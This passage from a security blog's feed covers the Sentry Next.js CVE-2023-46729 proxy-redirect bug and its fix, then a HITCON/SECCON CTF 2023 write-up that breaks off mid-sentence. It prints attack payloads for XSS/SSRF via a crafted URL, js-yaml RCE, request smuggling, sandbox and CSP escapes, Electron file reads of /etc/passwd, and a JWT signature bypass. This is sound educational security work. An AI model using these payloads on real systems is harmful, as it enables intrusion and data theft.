class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The crucial part is this section:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>  <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>  <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It determines the final URL to redirect to based on the <code>o</code> and <code>p</code> query string parameters.</p><p>The problem here is that both of these parameters use the <code>.*</code> regular expression, which matches any character. In other words, for the following URL:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;abc&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It will proxy to:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oabc.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It looks fine, but what if it’s like this?</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>%23</code> is the URL-encoded result of <code>#</code>. It will be proxied to:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oexample.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>We use <code>#</code> to include the original hostname as part of the hash and successfully change the destination of the proxy. However, the leading <code>o</code> is a bit annoying. Let’s get rid of it by adding <code>@</code> at the beginning:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;@example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>It becomes:</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;o@example.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>In this way, an attacker can use the <code>o</code> parameter to change the destination of the proxy and redirect the request anywhere. As mentioned earlier, this rewrite feature directly returns the response. So when a user visits <code>https://huli.tw/tunnel?o=@example.com%23&amp;p=def</code>, they will see the response of <code>example.com</code>.</p><p>In other words, if an attacker redirects the request to their own website, they can output <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, turning it into an XSS vulnerability.</p><p>If the attacker redirects the request to other internal web pages like <code>https://localhost:3001</code>, it becomes an SSRF vulnerability (but the target must support HTTPS).</p><p>As for the fix, it’s simple. Just add some restrictions to the regex. Finally, Sentry adjusted it to <a href="https://github.com/getsentry/sentry-javascript/pull/9416/files">only allow digits</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>\\d*)'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This issue has been fixed in version 7.77.0 and later.</p><h2><span id="conclusion">Conclusion</span></h2><p>This vulnerability is really simple and easy to reproduce. Just find the fix commit and take a look at the code to understand how to exploit it.</p><p>In summary, when doing URL rewriting, you really need to be cautious, as it’s easy to encounter issues (especially when you’re not just rewriting the path but the entire URL).</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;On November 9, 2023, Sentry published an article on their blog titled &lt;a href=&quot;https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/&quot;&gt;Next.js SDK Security Advisory - CVE-2023-46729&lt;/a&gt;. The article discusses the details of the CVE-2023-46729 vulnerability, including its cause, discovery time, and patching time.&lt;/p&gt;
&lt;p&gt;Although the vulnerability was officially announced on 11&amp;#x2F;9, it was actually fixed in version 7.77.0 released on 10&amp;#x2F;31. Some time was given to developers to patch the vulnerability.&lt;/p&gt;
&lt;p&gt;Now let’s briefly discuss the cause and attack method of this vulnerability.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF 2023 and SECCON CTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/</id>
    <published>2023-09-23T07:40:00.000Z</published>
    <updated>2023-09-23T08:17:56.034Z</updated>
    
    <content type="html"><![CDATA[<p>Both of these competitions had many interesting but challenging problems. I really learned a lot.</p><p>Keyword list:</p><ol><li>nim json, null byte</li><li>nim request smuggling</li><li>js-yaml</li><li>web worker</li><li>blob URL</li><li>meta redirect</li><li>file protocol &amp; .localhost domain</li><li>sxg: Signed Exchanges</li><li>431 CSP bypass</li><li>DOM clobbering document.body</li><li>ejs delimiter</li><li>Node.js + Deno prototype pollution gadget</li><li>XSleaks golang sort</li></ol><span id="more"></span><h2><span id="hitcon-ctf-2023">HITCON CTF 2023</span></h2><p>Recently, it seems rare to see web challenges with less than 10 solves for each problem. The last time I saw such a competition was probably DiceCTF. However, I think the difficulty is secondary. The main point is to have fun, find it interesting, and learn new things. These problems, in my opinion, clearly achieved that.</p><p>First, here are the write-ups from two authors.</p><ol><li><a href="https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/">https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw&#x2F;</a></li><li><a href="https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023">https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023</a></li></ol><p>Both authors wrote detailed write-ups. Here, I will just record some key points after reading them.</p><h3><span id="login-system-7-solves">Login System (7 solves)</span></h3><p>This challenge has two servers: one in Node.js and the other in Nim. Basically, most of the functionality is implemented in the Nim server. You can log in, register, and change passwords. User data is stored in a YAML file, and the goal is to achieve RCE (Remote Code Execution).</p><p>The first vulnerability is request smuggling. Node.js accepts <code>Transfer-Encoding: CHUNKED</code>, but Nim only looks at the <code>chunk</code>. This difference can be exploited for smuggling purposes.</p><p>But what can be done after smuggling?</p><p>The second vulnerability is related to Nim’s behavior with JSON. By setting a field to a very large number, Nim treats it as a <code>RawNumber</code>. When updating, it won’t include quotes. This can be used for JSON injection.</p><p>The third vulnerability is that, with JSON injection, you can use the functionality of js-yaml to create an object with a JS function. Finally, by calling <code>toString</code> on this object during rendering, RCE can be achieved.</p><p>It would look something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">privilegeLevel</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">toString</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>js<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">></span> <span class="token string">"function ()&#123;console.log('hi')&#125;"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">access</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'profile'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">register</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">login</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Oh, by the way, there is another vulnerability related to Nim’s file reading. The filename can be truncated using a null byte: <code>test.yaml\u0000</code></p><h3><span id="canvas-4-solves">Canvas (4 solves)</span></h3><p>This challenge is very interesting!</p><p>In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing <code>globalThis</code>. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through <code>setHTML</code> and is filtered by the browser’s Sanitizer API.</p><p>The worker’s sandbox is quite interesting. It looks something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">allKeys</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>obj <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> fnCons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>    <span class="token parameter">f</span> <span class="token operator">=></span> f<span class="token punctuation">.</span>constructor  <span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> fnCons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> cons <span class="token operator">=</span> <span class="token punctuation">[</span>Object<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Boolean<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> RegExp<span class="token punctuation">,</span> Promise<span class="token punctuation">,</span> Symbol<span class="token punctuation">,</span> BigInt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>fnCons<span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> cons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(1)</span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> argNames <span class="token operator">=</span> <span class="token function">allKeys</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span><span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token operator">...</span>argNames<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">callUserFn</span> <span class="token operator">=</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'User function error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token comment">// hardening</span><span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">callUserFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>argNames</code> collects the names of everything that <code>global</code> can access. This way, all the names can be treated as function parameters. It feels something like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">console<span class="token punctuation">,</span> Object<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> fetch<span class="token punctuation">,</span><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>So, no matter what you get, it will be <code>undefined</code>. When calling, <code>this</code> is also passed as <code>Object.create(null)</code>, so it’s not easy to escape.</p><p>Maple’s expected solution involves using try-catch and throwing an error to retrieve the value:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor<span class="token punctuation">&#125;</span>Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructorError<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace<span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> g <span class="token operator">=</span> e<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target  <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> g <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>He used a similar technique before in the DiceCTF 2022 - undefined challenge.</p><p>However, there is an easier solution for this challenge, utilizing the default behavior of <code>this</code>, as shown below:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>In JavaScript, when calling a function, the default <code>this</code> will be the global object. By using this, you can bypass restrictions.</p><p>But what can you do after bypassing the restrictions? It seems that you can’t do much in the worker because the main thread’s <code>setHTML</code> filters the content, and the CSP of this challenge is <code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code>.</p><p>The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">this<span class="token punctuation">.</span>Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>peko&lt;/h1>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>location <span class="token operator">=</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>What surprised me about this challenge is that the <code>&lt;meta&gt;</code> redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer’s restrictions.</p><p>However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use <code>worker.js</code> again, load it as a regular script, and execute XSS under the main thread.</p><p>This challenge is really interesting, and the use of blob is quite clever.</p><h3><span id="amf-4-solves">AMF (4 solves)</span></h3><p>I’m a bit lazy to study Python stuff, so I’ll leave it for now. The author has written a writeup.</p><h3><span id="harmony-2-solves">Harmony (2 solves)</span></h3><p>This challenge involves various Electron black magic.</p><p>In Chromium, domains ending with <code>.localhost</code> are ignored when using the file protocol, for example:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; failfile:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd&#x2F;&#x2F; successfile:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(I feel like I accidentally came across this code before)</p><p>And <code>file://</code> is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use <code>//</code> to bypass the check.</p><p>Next, <code>file://</code> is same-origin in Electron, so after loading your own file, you can access <code>top.api</code>.</p><p>Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn’t study the second half in detail, you can refer to the author’s writeup).</p><h3><span id="sharers-world-1-solve">Sharer’s World (1 solve)</span></h3><p>The key to this challenge is something called SXG: <a href="https://web.dev/signed-exchanges/">https://web.dev/signed-exchanges/</a></p><p>I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I’ve been lagging behind for too long.</p><p>Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website.</p><p>For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a></p><p>When a user visits <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a>, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com.</p><h2><span id="seccon-ctf-2023">SECCON CTF 2023</span></h2><p>As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn’t solve some of the challenges, I still learned a lot.</p><h3><span id="bad-jwt-107-solves">Bad JWT (107 solves)</span></h3><p>The goal of this challenge is to generate a JWT with <code>isAdmin: true</code>. The key lies in the logic of JWT verification:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> algorithms <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">hs256</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">hs512</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha512'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">createSignature</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token keyword">const</span> signature <span class="token operator">=</span> algorithms<span class="token punctuation">[</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> signature<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If <code>header.alg</code> is <code>constructor</code>, it becomes <code>const signature = Object(data,secret)</code>, and the resulting signature becomes a string object that only contains data, ignoring the secret:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Object</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// String &#123;'data'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Therefore, you just need to construct a signature that is the same.</p><p>For a more detailed writeup, you can refer to: <a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p><h3><span id="simplecalc-23-solves">SimpleCalc (23 solves)</span></h3><p>This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will 